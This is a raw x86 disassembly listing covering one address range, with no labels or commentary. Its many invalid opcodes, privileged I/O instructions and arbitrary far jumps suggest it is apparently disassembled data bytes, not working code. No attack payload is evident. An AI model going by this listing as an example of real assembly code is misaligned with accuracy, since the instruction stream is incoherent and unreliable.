  410e64:	push   esi
  410e65:	iret   
  410e66:	xchg   esi,eax
  410e67:	add    eax,0xc6fff306
  410e6c:	in     al,dx
  410e6d:	adc    BYTE PTR [edx+ebx*2],0xa1
  410e71:	pushf  
  410e72:	push   ebx
  410e73:	shl    DWORD PTR [ebp+0xf],0xe2
  410e77:	lods   eax,DWORD PTR cs:[esi]
  410e79:	lds    ecx,FWORD PTR cs:[ebx]
  410e7c:	xor    BYTE PTR [ebp-0x18],ah
  410e7f:	repnz cwde 
  410e81:	push   ecx
  410e82:	shr    BYTE PTR [edi+ecx*4],cl
  410e85:	js     0x410e93
  410e87:	jmp    0x410e1f
  410e89:	sub    ebx,ebx
  410e8b:	pop    ebp
  410e8c:	xchg   edi,eax
  410e8d:	in     al,0xfd
  410e8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e91:	sub    al,0x24
  410e93:	mov    dh,0x9a
  410e95:	jbe    0x410ed8
  410e97:	in     eax,0x84
  410e99:	dec    esi
  410e9a:	je     0x410e46
  410e9c:	push   bx
  410e9e:	and    esp,DWORD PTR [eax-0x2e2b1da4]
  410ea4:	xchg   ebx,eax
  410ea5:	pop    ss
  410ea6:	pop    ss
  410ea7:	pop    ss
  410ea8:	out    0x15,eax
  410eaa:	loopne 0x410ee3
  410eac:	hlt    
  410ead:	and    ah,BYTE PTR [ebx]
  410eaf:	mov    al,ds:0x65d207d0
  410eb4:	scas   al,BYTE PTR es:[edi]
  410eb5:	add    eax,0x25d2a9c7
  410eba:	fmul   QWORD PTR [esi]
  410ebc:	or     al,0xf9
  410ebe:	mov    ds:0x860d60e4,al
  410ec3:	fs cdq 
  410ec5:	test   BYTE PTR [ebp+0x28],bh
  410ec8:	test   eax,0x42d6a619
  410ecd:	popf   
  410ece:	aaa    
  410ecf:	xor    eax,DWORD PTR [edi-0x4cf50c8d]
  410ed5:	jns    0x410f0f
  410ed7:	xchg   BYTE PTR [edi-0x67],bl
  410eda:	adc    ah,BYTE PTR [ebp+esi*4-0x50]
  410ede:	rcl    edx,0xfc
  410ee1:	lahf   
  410ee2:	jg     0x410f4a
  410ee4:	adc    BYTE PTR [esp+eax*1],dl
  410ee7:	pop    edi
  410ee8:	lock pushf 
  410eea:	dec    esi
  410eeb:	or     DWORD PTR [ebp-0x24608a48],0x7e6e9a3a
  410ef5:	(bad)  
  410ef6:	ror    DWORD PTR [ebx+0x7a],cl
  410ef9:	sub    ecx,DWORD PTR [edi*2-0x1378454]
  410f00:	dec    edx
  410f01:	add    ebp,DWORD PTR [edx+ecx*2]
  410f04:	and    BYTE PTR [ebx-0x39],0xee
  410f08:	fwait
  410f09:	lods   al,BYTE PTR ds:[esi]
  410f0a:	int    0xb0
  410f0c:	mov    dh,0x64
  410f0e:	hlt    
  410f0f:	xchg   BYTE PTR [eax-0x5ed1e54a],cl
  410f15:	mov    edi,ecx
  410f17:	mov    cl,BYTE PTR [esi-0x29]
  410f1a:	rcl    ecx,1
  410f1c:	outs   dx,DWORD PTR ds:[esi]
  410f1d:	int3   
  410f1e:	mov    ch,0x64
  410f20:	ss (bad) 
  410f22:	rol    BYTE PTR ds:0x7dee5ff0,0xaf
  410f29:	push   0x69
  410f2b:	loope  0x410f62
  410f2d:	test   al,0x31
  410f2f:	sbb    al,0x26
  410f31:	xor    eax,0x7bc33bce
  410f36:	dec    edx
  410f37:	push   0xe8ae0f5b
  410f3c:	addr16 jg 0x410f5e
  410f3f:	outs   dx,DWORD PTR ss:[esi]
  410f41:	jle    0x410f62
  410f43:	test   al,0x67
  410f45:	fmul   QWORD PTR [esi+0x172e0a60]
  410f4b:	dec    ebx
  410f4c:	add    eax,DWORD PTR [ecx+ecx*1]
  410f4f:	push   0x32
  410f51:	sbb    DWORD PTR [ebx],eax
  410f53:	repnz aaa 
  410f55:	rcl    DWORD PTR [ecx-0x74],cl
  410f58:	adc    bh,ah
  410f5a:	std    
  410f5b:	cmp    DWORD PTR [edi],eax
  410f5d:	fdiv   QWORD PTR [ecx-0x3286d587]
  410f63:	push   es
  410f64:	jae    0x410fbf
  410f66:	test   al,0x49
  410f68:	inc    eax
  410f69:	mov    ecx,0x70cd2821
  410f6e:	mov    esi,0xca30d8d0
  410f73:	dec    ebx
  410f74:	dec    ebp
  410f75:	and    al,ah
  410f77:	adc    eax,0x6d514573
  410f7c:	dec    edi
  410f7d:	pop    es
  410f7e:	pop    ss
  410f7f:	or     bl,BYTE PTR [edx+0x5a]
  410f82:	fst    QWORD PTR [esi]
  410f84:	loop   0x410f7e
  410f86:	pop    ss
  410f87:	js     0x410f1b
  410f89:	and    ebp,ebp
  410f8b:	cli    
  410f8c:	or     dl,BYTE PTR [esi-0x15]
  410f8f:	push   edi
  410f90:	mov    WORD PTR [ebp+esi*4-0x724645a7],es
  410f97:	mov    ebx,0x1b9f41d1
  410f9c:	jp     0x410f85
  410f9e:	addr16 mov cl,0x4d
  410fa1:	cmp    al,0x50
  410fa3:	jl     0x410f78
  410fa5:	xlat   BYTE PTR ds:[ebx]
  410fa6:	int    0xc7
  410fa8:	mov    cl,0x55
  410faa:	or     al,0xf6
  410fac:	sub    esp,edi
  410fae:	mov    edi,0x94fe005a
  410fb3:	into   
  410fb4:	add    eax,0xaa47937f
  410fb9:	jl     0x411001
  410fbb:	aas    
  410fbc:	ins    BYTE PTR es:[edi],dx
  410fbd:	icebp  
  410fbe:	xchg   edi,eax
  410fbf:	iret   
  410fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fc1:	push   0xd7c47fe6
  410fc6:	xor    eax,0x9524639
  410fcb:	in     eax,0x9b
  410fcd:	imul   edi,DWORD PTR [ebx-0x747bc0f0],0x86c79d7a
  410fd7:	das    
  410fd8:	imul   esp,DWORD PTR [edx],0x121f96f8
  410fde:	jg     0x410f64
  410fe0:	loop   0x410ff9
  410fe2:	cwde   
  410fe3:	(bad)  
  410fe4:	in     al,0x4d
  410fe6:	or     DWORD PTR [edx+0x9],0x30746702
  410fed:	sbb    esi,ecx
  410fef:	rol    eax,0x34
  410ff2:	je     0x410fc4
  410ff4:	mov    ah,ah
  410ff6:	bound  ebx,QWORD PTR [esi]
  410ff8:	push   edx
  410ff9:	sub    al,0x90
  410ffb:	jp     0x411057
  410ffd:	mov    BYTE PTR [ecx+0x1b059975],bh
  411003:	sub    ch,BYTE PTR [edx+eax*1]
  411006:	jmp    0x4f89:0x76bda280
  41100d:	adc    eax,0x5f164b7e
  411012:	jns    0x410fbe
  411014:	mov    ds:0x11202f7b,eax
  411019:	popf   
  41101a:	daa    
  41101b:	shl    DWORD PTR [eax],cl
  41101d:	sahf   
  41101e:	jmp    0x4d9f3fe9
  411023:	lock jp 0x41107e
  411026:	add    dh,BYTE PTR [edx+0x6258d882]
  41102c:	sub    DWORD PTR [ebx+0xc],esp
  41102f:	jb     0x411033
  411031:	mov    fs,WORD PTR [ecx]
  411033:	lock call 0x19a9ccf1
  411039:	into   
  41103a:	ins    BYTE PTR es:[edi],dx
  41103b:	or     esp,0x55
  41103e:	sbb    al,0x20
  411040:	out    dx,al
  411041:	fidivr WORD PTR ds:[ebx-0x4e]
  411045:	mov    edi,0x1a592824
  41104a:	sbb    eax,0x89445f8c
  41104f:	mov    esi,0xbe05459
  411054:	jl     0x410fe3
  411056:	imul   ebx,DWORD PTR [edx+0x5d],0xdff7689b
  41105d:	out    0x83,al
  41105f:	push   eax
  411060:	xor    ebp,DWORD PTR [esi+0x31ecf2ff]
  411066:	adc    eax,0x44b5b666
  41106b:	dec    BYTE PTR [edi-0x6a]
  41106e:	es sub ebx,edi
  411071:	pop    eax
  411072:	std    
  411073:	mov    gs,WORD PTR [esi]
  411075:	aaa    
  411076:	rcl    dh,0x6d
  411079:	cmp    BYTE PTR [eax-0x6eecfde1],dl
  41107f:	push   edi
  411080:	fiadd  WORD PTR [edi]
  411082:	(bad)  
  411083:	rcr    WORD PTR [ebx-0x2938c98],0x31
  41108b:	rcl    BYTE PTR [esi-0x54],cl
  41108e:	mov    edi,0x5040742c
  411093:	int    0xed
  411095:	(bad)  
  411096:	fwait
  411097:	push   esi
  411098:	push   esi
  411099:	mov    edi,0x29a45e1d
  41109e:	and    ebx,edx
  4110a0:	mov    esi,0x2b0fbb46
  4110a5:	mov    ecx,0xae292509
  4110aa:	xlat   BYTE PTR ds:[ebx]
  4110ab:	mov    al,ds:0xf4c1c410
  4110b0:	pop    edi
  4110b1:	dec    ebx
  4110b2:	ror    BYTE PTR [esi+0x55],1
  4110b5:	cmp    al,0x53
  4110b7:	fisub  DWORD PTR [ebp-0x58]
  4110ba:	int3   
  4110bb:	dec    ebp
  4110bc:	mov    BYTE PTR [esp+esi*4-0x52],bl
  4110c0:	adc    BYTE PTR [edx+0x605f8c3e],0x5d
  4110c7:	push   ebp
  4110c8:	pop    ebx
  4110c9:	adc    eax,0xc4c5b8d0
  4110ce:	cli    
  4110cf:	xchg   BYTE PTR [edi],bl
  4110d1:	data16 xlat BYTE PTR ds:[ebx]
  4110d3:	jmp    0xe3f305d7
  4110d8:	lods   eax,DWORD PTR ds:[esi]
  4110d9:	add    al,ch
  4110db:	retf   0xfa80
  4110de:	add    cl,BYTE PTR [edx-0x37dfa451]
  4110e4:	je     0x411081
  4110e6:	lods   eax,DWORD PTR ds:[esi]
  4110e7:	repz mov ds:0xd697285a,eax
  4110ed:	adc    eax,esp
  4110ef:	pop    edi
  4110f0:	jmp    0x7f07aadf
  4110f5:	jns    0x411094
  4110f7:	sub    eax,0xaba4cea0
  4110fc:	adc    eax,0x5436da80
  411101:	push   ecx
  411102:	push   edi
  411103:	push   0xffffffc4
  411105:	out    0xfd,eax
  411107:	pop    ds
  411108:	or     edi,esp
  41110a:	(bad)  
  41110b:	loope  0x41112c
  41110d:	xchg   BYTE PTR [eax+esi*1+0x73f11ea5],bh
  411114:	xor    eax,0x3b3bd716
  411119:	mov    WORD PTR [eax-0x2a],cs
  41111c:	and    DWORD PTR [ebx+0x1294dfab],ebp
  411122:	jmp    0xab91:0xc9bdac78
  411129:	push   cs
  41112a:	jle    0x4110e7
  41112c:	in     al,0x68
  41112e:	sub    DWORD PTR [ecx],edx
  411130:	inc    esi
  411131:	mov    ds:0x163fb8ef,al
  411136:	sbb    eax,0xe9880e30
  41113b:	or     eax,0xe1b583f3
  411140:	xchg   edx,eax
  411141:	adc    DWORD PTR [ecx-0x460e170f],ebx
  411147:	push   cs
  411148:	jno    0x411164
  41114a:	push   ss
  41114b:	dec    edx
  41114c:	push   esi
  41114d:	imul   edx,eax,0xffffffde
  411150:	popf   
  411151:	dec    eax
  411152:	data16 aam 0xa2
  411155:	and    BYTE PTR [edi-0x62],0x81
  411159:	(bad)  
  41115a:	push   ecx
  41115b:	popf   
  41115c:	inc    ebp
  41115d:	ins    DWORD PTR es:[edi],dx
  41115e:	inc    edx
  411160:	aaa    
  411161:	cld    
  411162:	data16 adc dl,al
  411165:	addr16 retf 
  411167:	or     al,0x69
  411169:	aas    
  41116a:	mov    dl,0x99
  41116c:	add    al,0x70
  41116e:	push   ds
  41116f:	mov    ecx,0x19b85c57
  411174:	clc    
  411175:	push   cs
  411176:	out    dx,eax
  411177:	retf   0x7288
  41117a:	aas    
  41117b:	push   edi
  41117c:	sub    DWORD PTR [esi+eiz*4],edx
  41117f:	cwde   
  411180:	scas   eax,DWORD PTR es:[edi]
  411181:	(bad)  
  411182:	test   eax,0x963af11e
  411187:	mov    ah,0xcb
  411189:	cmp    eax,0xf9b1acdb
  41118e:	sbb    eax,0xd0bf1c44
  411193:	addr16 (bad) 
  411195:	sub    eax,0x36a32422
  41119a:	test   al,0x84
  41119c:	stos   DWORD PTR es:[edi],eax
  41119d:	lds    edx,FWORD PTR [eax]
  41119f:	mov    al,ds:0xd5aae471
  4111a4:	jnp    0x41115a
  4111a6:	les    edx,FWORD PTR ds:0xc3e1c404
  4111ac:	fstp   TBYTE PTR [edi]
  4111ae:	out    dx,eax
  4111af:	add    ch,bh
  4111b1:	or     bh,BYTE PTR [edi]
  4111b3:	das    
  4111b4:	or     DWORD PTR [eax+esi*1+0x2b],ebx
  4111b8:	xchg   ecx,eax
  4111b9:	pop    edx
  4111ba:	enter  0xdfa,0x93
  4111be:	mov    esp,0xcb676e5c
  4111c3:	xor    eax,0x1f1b65c3
  4111c8:	stos   BYTE PTR es:[edi],al
  4111c9:	dec    esp
  4111ca:	xchg   ecx,eax
  4111cb:	lock fistp QWORD PTR ds:0xa3a113a8
  4111d2:	imul   eax,DWORD PTR [esi+eax*2-0x67f197b2],0xffffffc2
  4111da:	sub    dh,BYTE PTR [ebx+0x2e]
  4111dd:	and    al,0x8a
  4111df:	enter  0x435c,0x33
  4111e3:	jb     0x4111e8
  4111e5:	jno    0x4111bb
  4111e7:	sub    DWORD PTR [eax+0x63066f3a],edi
  4111ed:	mov    ebx,0x2e432e7b
  4111f2:	stos   DWORD PTR es:[edi],eax
  4111f3:	mov    edi,0xbf04a179
  4111f8:	sbb    BYTE PTR ds:0xfd049b0b,bh
  4111fe:	jmp    0x411199
  411200:	popa   
  411201:	push   ebp
  411202:	je     0x4111fd
  411204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411205:	inc    ebx
  411206:	or     al,0xab
  411208:	xor    BYTE PTR [esi+0x49],cl
  41120b:	mov    eax,0x540e1d19
  411210:	push   edi
  411211:	mov    dh,0x8c
  411213:	inc    esi
  411214:	mov    edx,0xb96153b5
  411219:	pop    ebx
  41121a:	cmp    ecx,DWORD PTR [edx]
  41121c:	fild   QWORD PTR [ebx+0x13]
  41121f:	cs jns 0x4111bd
  411222:	rol    DWORD PTR [edx],cl
  411224:	push   ebx
  411225:	aam    0xbc
  411227:	outs   dx,BYTE PTR ds:[esi]
  411228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411229:	xor    BYTE PTR [ebx+0x11ff4e3b],ah
  41122f:	retf   0x1d75
  411232:	push   edi
  411233:	xchg   ebp,eax
  411234:	les    edx,FWORD PTR [esi+edx*2-0x50]
  411238:	mov    ecx,0xefca379c
  41123d:	addr16 pop ds
  41123f:	jecxz  0x411298
  411241:	cmp    esi,ebx
  411243:	mov    eax,ds:0x39380d4a
  411248:	fcmovu st,st(6)
  41124a:	scas   eax,DWORD PTR es:[edi]
  41124b:	retf   0x3854
  41124e:	sbb    ecx,DWORD PTR [ecx]
  411250:	(bad)  
  411251:	ja     0x411231
  411253:	call   0xa6288d4
  411258:	in     al,0xcb
  41125a:	or     al,0xe7
  41125c:	int3   
  41125d:	mov    esi,0x62bc831d
  411262:	aad    0x75
  411264:	xchg   ebx,eax
  411265:	mov    ds:0x114eefbc,al
  41126a:	xchg   edx,eax
  41126b:	aas    
  41126c:	(bad)  
  41126e:	pusha  
  41126f:	and    dh,BYTE PTR [esi]
  411271:	pop    edx
  411272:	inc    edi
  411273:	cmp    ah,BYTE PTR [edi-0x53]
  411276:	push   ebx
  411277:	push   ebx
  411278:	xchg   ebx,eax
  411279:	ret    
  41127a:	cmp    al,BYTE PTR [ecx+0x57483698]
  411280:	jnp    0x4112a3
  411282:	mov    ecx,0x59274a21
  411287:	mov    al,ds:0xb35d5d75
  41128c:	das    
  41128d:	jns    0x411286
  41128f:	sub    BYTE PTR [ecx-0x24],al
  411292:	dec    esi
  411293:	push   ss
  411294:	pop    esi
  411295:	out    0x6c,al
  411297:	jl     0x41126d
  411299:	sbb    DWORD PTR [edx],esp
  41129b:	mov    esi,0x9e419263
  4112a0:	xchg   BYTE PTR [ebp-0x3ccae005],bl
  4112a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a7:	fwait
  4112a8:	shr    DWORD PTR [edi],0xf7
  4112ab:	pop    edi
  4112ac:	and    DWORD PTR [ebp-0x2d],eax
  4112af:	sti    
  4112b0:	cwde   
  4112b1:	xor    BYTE PTR ds:0x8e684c06,dl
  4112b7:	adc    eax,0xee8499a4
  4112bc:	inc    ebx
  4112bd:	xor    bh,BYTE PTR [eax-0xf]
  4112c0:	dec    esp
  4112c1:	jb     0x41125e
  4112c3:	fisttp DWORD PTR [edx+ebx*8]
  4112c6:	add    eax,0x7ac834c2
  4112cb:	mov    edx,0x3647b423
  4112d0:	mov    esp,ecx
  4112d2:	sti    
  4112d3:	(bad)  
  4112d5:	mov    bl,0x15
  4112d7:	stos   DWORD PTR es:[edi],eax
  4112d8:	scas   al,BYTE PTR es:[edi]
  4112d9:	jle    0x4112f6
  4112db:	in     eax,0xc0
  4112dd:	jns    0x41129d
  4112df:	std    
  4112e0:	add    ebp,0xffffffb3
  4112e3:	das    
  4112e4:	ins    BYTE PTR es:[edi],dx
  4112e5:	sub    esi,DWORD PTR [ebx+0x44]
  4112e8:	aas    
  4112e9:	pop    ebp
  4112ea:	dec    eax
  4112eb:	push   ecx
  4112ec:	test   eax,0x2d619704
  4112f1:	sbb    cl,BYTE PTR [eax]
  4112f3:	jne    0x4112ae
  4112f5:	push   ds
  4112f6:	std    
  4112f7:	mov    dl,0x23
  4112f9:	cmp    esi,DWORD PTR ds:0xfbedec86
  4112ff:	jnp    0x411307
  411301:	dec    eax
  411302:	clc    
  411303:	cdq    
  411304:	push   edi
  411305:	fdivr  QWORD PTR [esi]
  411307:	pop    eax
  411308:	or     al,0x46
  41130a:	mov    WORD PTR [edx-0x2ec16d24],gs
  411310:	mov    edi,0xdab86e50
  411315:	loop   0x4112e1
  411317:	lods   al,BYTE PTR ds:[esi]
  411318:	lea    ebx,[eax-0x6faa166e]
  41131e:	test   eax,0x862931ae
  411323:	sub    ah,dl
  411325:	and    eax,0xf231e225
  41132a:	pushf  
  41132b:	arpl   bx,sp
  41132d:	in     al,dx
  41132e:	shr    cl,cl
  411330:	dec    eax
  411331:	rcl    BYTE PTR [ecx+0x56],0xc9
  411335:	clc    
  411336:	imul   DWORD PTR [edi+0x5b]
  411339:	add    eax,0xab026e0f
  41133e:	jg     0x4112c9
  411340:	enter  0xdb08,0xfb
  411344:	jns    0x411303
  411346:	mov    edx,0x2d886752
  41134b:	or     al,0x5
  41134d:	add    eax,0x4583884f
  411352:	sub    al,0x84
  411354:	pushf  
  411355:	cmp    ah,al
  411357:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411358:	outs   dx,BYTE PTR ds:[esi]
  411359:	mov    bh,0x97
  41135b:	jo     0x4113d6
  41135d:	aaa    
  41135e:	in     al,0xbd
  411360:	retf   0xc1a7
  411363:	inc    ebp
  411364:	retf   
  411365:	adc    DWORD PTR [eax],eax
  411367:	popf   
  411368:	adc    al,bl
  41136a:	and    eax,ebp
  41136c:	nop
  41136d:	xchg   edx,eax
  41136e:	cmp    al,0xc0
  411370:	(bad)  
  411371:	and    al,0xa5
  411373:	mov    cl,BYTE PTR [edi-0x305ca275]
  411379:	inc    ecx
  41137a:	call   0x1a1f:0x132c0828
  411381:	push   es
  411382:	retf   0x2c4f
  411385:	mov    esp,0x99a10571
  41138a:	mov    edx,0x5b07fa5a
  41138f:	sti    
  411390:	in     eax,dx
  411391:	sbb    BYTE PTR [ebp-0x4a99ff4],ah
  411397:	dec    DWORD PTR [esi+0x4b691b7f]
  41139d:	sub    ch,bl
  41139f:	pop    eax
  4113a0:	pusha  
  4113a1:	or     edi,DWORD PTR [eax+ebp*2-0x7f392f1d]
  4113a8:	das    
  4113a9:	xor    bl,BYTE PTR [eax+edx*4]
  4113ac:	fsub   QWORD PTR [ebp+0x8]
  4113af:	into   
  4113b0:	xor    bl,dh
  4113b2:	sbb    BYTE PTR [esi],0x6e
  4113b5:	outs   dx,BYTE PTR ds:[esi]
  4113b6:	retf   0x2889
  4113b9:	push   0xa4e9400
  4113be:	pop    esi
  4113bf:	add    al,0x6
  4113c1:	pop    ecx
  4113c2:	ins    BYTE PTR es:[edi],dx
  4113c3:	and    al,0xf4
  4113c5:	mov    bl,0x37
  4113c7:	ret    
  4113c8:	loopne 0x4113e3
  4113ca:	cmp    eax,0x73ac8190
  4113cf:	cmp    dh,BYTE PTR [esp+esi*8]
  4113d2:	push   ecx
  4113d3:	cld    
  4113d4:	jmp    0x9c9e8af6
  4113d9:	jmp    0xcf3c:0xc0270bd8
  4113e0:	(bad)  
  4113e1:	xor    eax,0xc09cae84
  4113e6:	in     al,dx
  4113e7:	push   edi
  4113e8:	imul   esp,DWORD PTR [edx],0x13
  4113eb:	test   DWORD PTR [eax+0x23],ebx
  4113ee:	xchg   edx,eax
  4113ef:	gs stos BYTE PTR es:[edi],al
  4113f1:	fst    QWORD PTR [eax+eiz*2-0x7]
  4113f5:	dec    eax
  4113f6:	sbb    bl,BYTE PTR [eax-0x76ee2601]
  4113fc:	ficom  DWORD PTR [esi]
  4113fe:	mov    bh,0xd
  411400:	daa    
  411401:	je     0x4113c9
  411403:	in     eax,dx
  411404:	pop    ebx
  411405:	jmp    0x6405905d
  41140a:	dec    esp
  41140b:	dec    eax
  41140c:	adc    esi,esi
  41140e:	call   0x1853:0x13a787af
  411415:	jmp    0x102:0xc62411ab
  41141c:	xchg   ebp,eax
  41141d:	sbb    ah,BYTE PTR [edx+0x5654e198]
  411423:	sbb    dl,BYTE PTR [eax]
  411425:	(bad)  
  411426:	imul   eax,ebx,0xffffffb0
  411429:	es pop ds
  41142b:	pusha  
  41142c:	int3   
  41142d:	jns    0x4113c1
  41142f:	adc    esp,ebx
  411431:	add    al,0x6e
  411433:	xor    al,0x26
  411435:	or     ecx,DWORD PTR ds:0x97f73b25
  41143b:	scas   al,BYTE PTR es:[edi]
  41143c:	mov    edi,0x2bd43824
  411441:	pusha  
  411442:	aaa    
  411443:	stc    
  411444:	inc    esp
  411445:	ja     0x411444
  411447:	jo     0x4113e7
  411449:	xor    esp,edx
  41144b:	and    DWORD PTR [eax],ebp
  41144d:	and    BYTE PTR [ebp-0x2860bae6],ah
  411453:	mov    dl,0xe
  411455:	popa   
  411456:	leave  
  411457:	icebp  
  411458:	xchg   edi,eax
  411459:	pop    ds
  41145a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41145b:	or     bl,BYTE PTR [eax]
  41145d:	mov    edx,0x59f5650a
  411462:	je     0x4114e1
  411464:	(bad)  
  411465:	jmp    0x2d7e:0xb8759e61
  41146c:	das    
  41146d:	inc    ecx
  41146e:	pop    ecx
  41146f:	mul    dl
  411471:	jmp    0xd17d:0x2dd7761f
  411478:	push   ds
  411479:	popf   
  41147a:	mov    dl,0x31
  41147c:	aas    
  41147d:	add    edx,DWORD PTR [ebp+0x46]
  411480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411481:	add    edi,esp
  411483:	cmp    eax,0x8468a5ee
  411488:	mov    ss,esi
  41148a:	ret    0x7a86
  41148d:	mov    ch,0x97
  41148f:	mov    ds,WORD PTR [esi+ebx*8+0x5c79b287]
  411496:	je     0x4114e9
  411498:	ret    0xaded
  41149b:	clc    
  41149c:	addr16 iret 
  41149e:	loop   0x411438
  4114a0:	cmc    
  4114a1:	test   al,0x22
  4114a3:	or     BYTE PTR [ebp-0x20],al
  4114a6:	jae    0x41147d
  4114a8:	test   al,0xdd
  4114aa:	dec    ebp
  4114ab:	xor    al,0xfa
  4114ad:	mov    eax,0x7856136f
  4114b2:	shl    DWORD PTR [ebx],cl
  4114b4:	pop    ebx
  4114b5:	dec    ebp
  4114b6:	push   esi
  4114b7:	js     0x4114f6
  4114b9:	mov    BYTE PTR [edx+0x6f],ch
  4114bc:	dec    ebx
  4114bd:	cmp    ecx,DWORD PTR [ecx+0x4bc8a4b8]
  4114c3:	neg    BYTE PTR [esp+eiz*2-0x33]
  4114c7:	arpl   dx,si
  4114c9:	lods   al,BYTE PTR cs:[esi]
  4114cb:	(bad)  
  4114cc:	std    
  4114cd:	mov    esi,0xe341c96f
  4114d2:	imul   ecx,DWORD PTR [edi],0xf4734915
  4114d8:	daa    
  4114d9:	rcr    DWORD PTR [ebp+0x34],1
  4114dc:	pop    es
  4114dd:	cmp    eax,0x518be8f6
  4114e2:	lods   eax,DWORD PTR ds:[esi]
  4114e3:	pop    ebp
  4114e4:	dec    edi
  4114e5:	std    
  4114e6:	in     al,dx
  4114e7:	(bad)  
  4114e8:	call   0x2be576c9
  4114ed:	aam    0x1
  4114ef:	retf   
  4114f0:	xor    eax,0xe4d0aaa
  4114f5:	mov    eax,0xe43a518d
  4114fa:	mov    ebx,0x42b11c4b
  4114ff:	xchg   ecx,eax
  411500:	scas   al,BYTE PTR es:[edi]
  411501:	in     eax,0x92
  411503:	fistp  WORD PTR [esi+ecx*1+0x6b]
  411507:	push   edx
  411508:	das    
  411509:	xchg   ebx,eax
  41150a:	addr16 xor eax,0xfac25ec7
  411510:	sbb    al,0x5c
  411512:	fistp  QWORD PTR [esi+0x65]
  411515:	adc    ah,bh
  411517:	sub    esi,DWORD PTR [edx+ebp*4]
  41151a:	sbb    al,0x6d
  41151c:	inc    eax
  41151d:	jle    0x41150e
  41151f:	or     BYTE PTR [ecx-0x7b],al
  411522:	push   es
  411523:	fdivr  DWORD PTR ds:0x1e6bcc37
  411529:	jp     0x4115a0
  41152b:	jb     0x411548
  41152d:	or     cl,BYTE PTR [ebp+edi*8+0x72af47e0]
  411534:	dec    eax
  411535:	lock dec esi
  411537:	data16 adc BYTE PTR [ecx],cl
  41153a:	test   eax,0x887665cf
  41153f:	mov    ecx,0x196cadca
  411544:	and    BYTE PTR [ebp+0x5b4cac9b],ah
  41154a:	jb     0x4115a4
  41154c:	hlt    
  41154d:	xor    eax,0xdffa0037
  411552:	pushf  
  411553:	pusha  
  411554:	mov    eax,0x1904f0e7
  411559:	rol    BYTE PTR ds:0xd6dc64bf,0xac
  411560:	ret    
  411561:	hlt    
  411562:	fs pop ds
  411564:	mov    ebp,0xbeb75e5d
  411569:	xor    ah,BYTE PTR [edx*4+0x76ce3f18]
  411570:	mov    eax,ds:0xc8f8fc5e
  411575:	jno    0x41155a
  411577:	push   0x36
  411579:	ins    DWORD PTR es:[edi],dx
  41157a:	jp     0x4114fd
  41157c:	jmp    0x4115a3
  41157e:	pusha  
  41157f:	pop    es
  411580:	int3   
  411581:	cli    
  411582:	cmp    cl,BYTE PTR [edi+ebp*1-0x7381ca24]
  411589:	pop    esi
  41158a:	push   ecx
  41158b:	lea    ebp,[ecx+edx*2+0x35fb1e08]
  411592:	pushf  
  411593:	scas   eax,DWORD PTR es:[edi]
  411594:	scas   al,BYTE PTR es:[edi]
  411595:	rcl    DWORD PTR [ebx-0x7b9d8452],cl
  41159b:	enter  0x1f49,0xa5
  41159f:	and    BYTE PTR [ebx+edi*8],bh
  4115a2:	push   ebx
  4115a3:	push   0xffffffa8
  4115a5:	inc    ebx
  4115a6:	es mov bl,0xb5
  4115a9:	lock xchg esi,eax
  4115ab:	das    
  4115ac:	repnz or al,0xb9
  4115af:	xlat   BYTE PTR ds:[ebx]
  4115b0:	push   ecx
  4115b1:	fs xchg ebp,eax
  4115b3:	aad    0xfe
  4115b5:	das    
  4115b6:	es jp  0x41159c
  4115b9:	bound  ecx,QWORD PTR [edi]
  4115bb:	jbe    0x4115d3
  4115bd:	jle    0x4115f5
  4115bf:	mov    esi,0x6650ba9b
  4115c4:	into   
  4115c5:	push   esi
  4115c6:	lods   al,BYTE PTR ds:[esi]
  4115c7:	shr    cl,1
  4115c9:	and    ecx,esp
  4115cb:	mov    al,0xb0
  4115cd:	arpl   WORD PTR [ebx-0x6b8114e8],sp
  4115d3:	gs mov edx,0x9c2051de
  4115d9:	jnp    0x4115cc
  4115db:	mov    bh,0xd
  4115dd:	scas   al,BYTE PTR es:[edi]
  4115de:	jo     0x411630
  4115e0:	leave  
  4115e1:	adc    BYTE PTR ds:0x401158f4,0x1b
  4115e8:	sbb    BYTE PTR [edx+0xafb95dd],al
  4115ee:	sub    ecx,DWORD PTR [edi]
  4115f0:	push   esi
  4115f1:	add    al,0x3
  4115f3:	sbb    DWORD PTR [ebx-0x40],edi
  4115f6:	fmul   st(7),st
  4115f8:	or     esi,ebx
  4115fa:	mov    ebp,0xc648b0d7
  4115ff:	or     bl,BYTE PTR [eax]
  411601:	test   eax,0x5486b90a
  411606:	inc    ebx
  411607:	cdq    
  411608:	push   esi
  411609:	fs mov edi,0x6fa4c668
  41160f:	sbb    DWORD PTR [esi-0x5b],edi
  411612:	xor    ax,0x7159
  411616:	cwde   
  411617:	stos   BYTE PTR es:[edi],al
  411618:	mov    ch,0x94
  41161a:	or     eax,0xfb962a6e
  41161f:	aaa    
  411620:	and    ebx,DWORD PTR [esi+0x5c]
  411623:	or     cl,BYTE PTR [ecx]
  411625:	jo     0x4115fd
  411627:	ret    0x52ec
  41162a:	int3   
  41162b:	repnz daa 
  41162d:	leave  
  41162e:	sti    
  41162f:	inc    ebp
  411630:	mov    ebp,0x4b1158c4
  411635:	dec    edx
  411636:	lods   eax,DWORD PTR ds:[esi]
  411637:	fwait
  411638:	jg     0x411650
  41163a:	call   0xe489:0x215e65b5
  411641:	cmp    DWORD PTR [esi+ebp*1],esi
  411644:	idiv   DWORD PTR [ebx+0x40]
  411647:	sub    bl,BYTE PTR [ebp-0x1c255fea]
  41164d:	sub    al,0xb9
  41164f:	xchg   esi,eax
  411650:	sub    ch,BYTE PTR [ecx+0x23]
  411653:	pop    esi
  411654:	xchg   ecx,eax
  411655:	shr    BYTE PTR [esi],cl
  411657:	or     eax,0xe7995a98
  41165c:	lahf   
  41165d:	mov    edx,edx
  41165f:	retf   0xf80b
  411662:	mov    ah,0xd4
  411664:	mov    ebp,0xa15b1e08
  411669:	lock sbb BYTE PTR [ebx],0x27
  41166d:	mov    dl,0x8f
  41166f:	inc    ebp
  411670:	cmp    ebx,edx
  411672:	jl     0x41160c
